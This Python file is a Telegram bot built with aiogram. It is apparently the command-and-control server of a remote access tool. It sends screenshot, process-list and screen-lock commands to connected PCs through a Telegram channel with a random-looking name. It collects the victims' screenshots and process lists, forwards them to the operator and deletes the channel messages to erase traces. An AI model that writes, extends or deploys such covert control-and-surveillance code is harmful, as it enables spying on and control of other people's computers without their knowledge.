import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN") # Токен БОТА №1 (Сервер)
ADMIN_ID = 5153650495  # Твой ID

# ЮЗЕРНЕЙМ ТВОЕГО КАНАЛА БЕЗ СИМВОЛА @
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

connected_pcs = {}

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer("🤖 Пульт управления (Два бота через канал) готов.\n\n/devices — Список устройств")

@dp.message(Command("devices"))
async def cmd_devices(message: types.Message):
    if not is_admin(message.from_user.id): return
    if not connected_pcs:
        await message.answer("❌ Список устройств пуст. Ожидайте сигнал от клиента.")
        return
    keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
    await message.answer("🎛 Выберите устройство:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = connected_pcs.get(device_id)
    if not device_info: return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Сделать скриншот", callback_data=f"cmd_screen_{device_id}")],
        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_tasklist_{device_id}")],
        [InlineKeyboardButton(text="🔒 Заблокировать экран", callback_data=f"cmd_lock_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад к списку", callback_data="back_to_list")]
    ])
    await callback.message.edit_text(text=f"💻 ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    _, cmd_type, device_id = callback.data.split("_", 2)
    try:
        # Бот №1 публикует команду в канал для клиента
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
        await callback.answer("🚀 Команда отправлена в канал!")
    except:
        await callback.answer("❌ Ошибка. Проверь, что Бот №1 админ в канале.")

@dp.callback_query(F.data == "back_to_list")
async def back_to_list(callback: types.CallbackQuery):
    await callback.message.delete()
    await cmd_devices(callback.message)


# --- БОТ №1 СЧИТЫВАЕТ ДАННЫЕ ИЗ КАНАЛА, КОТОРЫЕ КИДАЕТ БОТ №2 ---

@dp.channel_post(F.text.startswith("PING:"))
async def handle_channel_ping(message: types.Message):
    """Ловим пинг от БОТА №2 из канала"""
    try:
        _, device_id, pc_name = message.text.split(":")
        if device_id not in connected_pcs:
            connected_pcs[device_id] = {"name": pc_name}
            # Оповещаем тебя в личку о новом устройстве
            await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 **ПК `{pc_name}` обнаружен онлайн через канал!**", parse_mode="Markdown")
        await message.delete()  # Удаляем техническое сообщение, чтобы очистить канал
    except: pass

@dp.channel_post(F.document & F.caption.startswith("SCREEN_REPLY:"))
async def receive_channel_screenshot(message: types.Message):
    """Ловим скриншот от БОТА №2 из канала и пересылаем тебе в личку"""
    try:
        device_id = message.caption.split(":")[1]
        pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
        file_buffer = await bot.download_file((await bot.get_file(message.document.file_id)).file_path)
        await bot.send_photo(chat_id=ADMIN_ID, photo=BufferedInputFile(file_buffer.read(), filename="s.png"), caption=f"📸 Скриншот: *{pc_name}*", parse_mode="Markdown")
        await message.delete()  # Удаляем из канала
    except: pass

@dp.channel_post(F.text.startswith("LOG_REPLY:"))
async def receive_channel_log(message: types.Message):
    """Ловим список процессов от БОТА №2 из канала и пересылаем тебе в личку"""
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown")
        await message.delete()  # Удаляем из канала
    except: pass

async def main():
    print("[СЕРВЕР] Бот №1 запущен и слушает канал!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
